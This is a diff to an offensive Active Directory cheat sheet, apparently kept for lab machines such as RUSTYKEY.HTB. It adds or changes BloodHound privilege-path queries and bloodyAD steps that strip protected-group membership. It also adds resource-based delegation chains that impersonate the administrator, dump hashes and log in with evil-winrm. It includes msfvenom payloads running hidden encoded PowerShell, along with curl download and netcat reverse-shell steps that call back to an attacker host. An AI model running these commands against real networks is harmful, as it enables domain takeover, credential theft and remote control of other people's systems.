@@ -108,20 +108,21 @@ http://127.0.0.1:8080
 admin:RANDOM_PASSWORD
 
 +---------- Queries ----------+
--->> Privileges: Groups with Users
-MATCH (g:Group)<-[:MemberOf]-(u:User)-[r1]->(n1)-[r2]->(n2)
-WHERE NOT toLower(u.name) CONTAINS "admin"
+-->> Privileges: Groups with Users and Computers
+MATCH (g:Group)<-[:MemberOf]-(e)-[r1]->(n1)-[r2]->(n2)
+WHERE (e:User OR e:Computer)
+  AND NOT toLower(e.name) CONTAINS "admin"
   AND NOT toLower(g.name) CONTAINS "admin"
   AND NOT toLower(n1.name) CONTAINS "admin"
   AND NOT toLower(n2.name) CONTAINS "admin"
   AND NOT n1.name ENDS WITH "DOMAIN USERS"
   AND NOT n2.name ENDS WITH "DOMAIN USERS"
   AND NOT toLower(g.name) CONTAINS "guest"
-  AND NOT toLower(u.name) CONTAINS "guest"
+  AND NOT toLower(e.name) CONTAINS "guest"
 OPTIONAL MATCH (n2)-[r3]->(connected)
-WITH g, u, r1, n1, r2, n2, r3, connected
-MATCH (u)-[m:MemberOf]->(g)
-RETURN DISTINCT g, u, m, r1, n1, r2, n2, r3, connected
+WITH g, e, r1, n1, r2, n2, r3, connected
+MATCH (e)-[m:MemberOf]->(g)
+RETURN DISTINCT g, e, m, r1, n1, r2, n2, r3, connected
 LIMIT 1000
 
 ## Create Custom Usernames List
@@ -480,8 +481,13 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile us
 +---------- ForceChangePassword ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
 
-+---------- Remove Prtected ----------+
++---------- Remove Protected ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
+
++---------- AllowedToAct ----------+
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount 'OWNED_COMPUTER$' -Identity 'DC'
+impacket-getTGT -dc-ip $TARGET $DOM/'OWNED_COMPUTER$':'$PASSWORD'; export KRB5CCNAME='OWNED_COMPUTER$.ccache'
+impacket-getST -dc-ip $TARGET $DOM/'OWNED_COMPUTER$' -k -no-pass -impersonate $USERNAME -spn "cifs/$DC"; mv *$USERNAME@*.ccache $USERNAME.ccache; export KRB5CCNAME=`pwd`/$USERNAME.ccache
 
 +---------- Add ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
@@ -827,7 +833,7 @@ impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
 impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
-impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "host/$DC"; mv *administrator@*.ccache administrator.ccache; export KRB5CCNAME=`pwd`/administrator.ccache
+impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; export KRB5CCNAME=`pwd`/administrator.ccache
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
 
@@ -1321,6 +1327,8 @@ powershell -c "Start-ScheduledTask -TaskName 'Ownership'"
 
 +---------- Shell From File ----------+
 rlwrap nc -lvnp 5555
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP> WEB DELIVERY' EXITFUNC=none -f dll > x.dll
+msfvenom -p windows/x64/exec CMD='powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQBy<SNIP> WEB DELIVERY' EXITFUNC=none -f exe > x.exe
 curl http://$MYIP:8888/bat2exe.bat -o \programdata\bat2exe.bat
 powershell -c "\programdata\bat2exe.bat $MYIP 5555; \programdata\x.exe"
 
